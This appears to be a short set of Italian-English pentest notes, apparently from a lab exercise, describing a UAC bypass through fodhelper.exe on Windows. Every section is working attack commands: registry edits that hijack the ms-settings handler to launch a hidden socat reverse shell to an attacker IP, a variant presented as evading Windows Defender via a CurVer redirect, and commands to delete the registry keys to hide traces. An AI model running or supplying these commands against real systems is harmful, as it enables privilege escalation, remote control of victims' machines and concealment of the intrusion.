### **FODHELPER.EXE**

Assegna i valori di registro necessari per associare ms-settings class ad una reverse shell

 1. Create the REG_KEY variable
```POWERSHELL
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
```

 2. Create the CMD variable
```POWERSHELL
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.69.95:4444 EXEC:cmd.exe,pipes"
```
 3. Add the registry key DelegateExecute with an empty value for the class association to take effect
```POWERSHELL
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```
 4. Add the command to execute to the registry key when fodhelper.exe is started.
```POWERSHELL
reg add %REG_KEY% /d %CMD% /f
```
5. Start fodhelper program
```POWERSHELL
fodhelper.exe
```
pulisci le tue traccie come un ninja
```POWERSHELL
reg delete HKCU\Software\Classes\ms-settings\ /f
```
### **BYPASS WINDOWS DEFENDER CON FODHELPER.EXE**

The command to execute - will send a reverse shell to our attacker machine
```POWERSHELL
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.69.95:4445 EXEC:cmd.exe,pipes"
```
Creating a new ProgID .thm
```POWERSHELL
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
```
Then, we can create the CurVer ProgID subkey to the ms-setting ProgID. The subkey value points to the new ProgID we just created.
```POWERSHELL
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
```
Pulisci un pochino
```POWERSHELL
reg delete "HKCU\Software\Classes\.thm\" /f

reg delete "HKCU\Software\Classes\ms-settings\" /f
```